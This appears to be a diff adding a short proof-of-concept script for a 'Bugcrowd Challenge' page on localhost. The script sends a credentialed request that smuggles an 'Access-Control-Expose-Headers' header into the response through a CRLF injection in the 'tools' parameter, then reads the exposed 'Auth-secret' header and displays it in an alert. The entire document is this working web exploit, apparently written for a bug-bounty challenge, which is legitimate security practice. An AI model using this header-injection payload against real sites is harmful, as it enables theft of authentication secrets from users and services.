@@ -1,0 +1,13 @@
+<script>
+var client = new XMLHttpRequest();
+client.open("GET", "http://localhost/Bugcrowd%20Challenge/main.php?tools=xxxx%0d%0aAccess-Control-Expose-Headers:%20Auth-secret", true);
+client.withCredentials = true;
+client.send();
+
+client.onreadystatechange = function() {
+  if(this.readyState == this.HEADERS_RECEIVED && this.status == 203) {
+    var value = client.getResponseHeader("Auth-secret");
+    alert(value);
+  }
+}
+</script>
